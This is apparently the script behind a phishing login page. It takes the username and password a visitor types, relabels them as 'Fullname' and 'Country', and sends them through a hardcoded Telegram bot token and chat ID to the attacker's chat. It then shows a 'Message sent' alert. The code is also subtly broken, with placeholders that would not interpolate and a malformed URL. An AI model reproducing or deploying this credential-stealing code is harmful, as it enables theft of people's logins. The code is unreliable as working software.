const loginButton = document.querySelector("#loginBtn");
const password = document.querySelector("#passwordInput");
const username = document.querySelector("#usernameInput");
const showPasswordBtn = document.querySelector("#showPasswordBtn");

document.getElementById("loginBtn").addEventListener("click", function(e) {
e.preventDefault(); 

const password = document.querySelector("#passwordInput");
const username = document.querySelector("#usernameInput");

var message = "<html><br>| Fullname: ${password} <br> | Country: ${username} <br></html>";

var token = "6492518299:AAFsdc-VOPjaKoM4t2QuSaOHPBFtGaz57B0";
var chat_id = -5721465632;
var url = 'https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}text=${message}&parse_mode=html';

var oReq = new XMLHttpRequest();
oReq.open("GET", url, true);
oReq.send();

alert("Message sent");
}); 
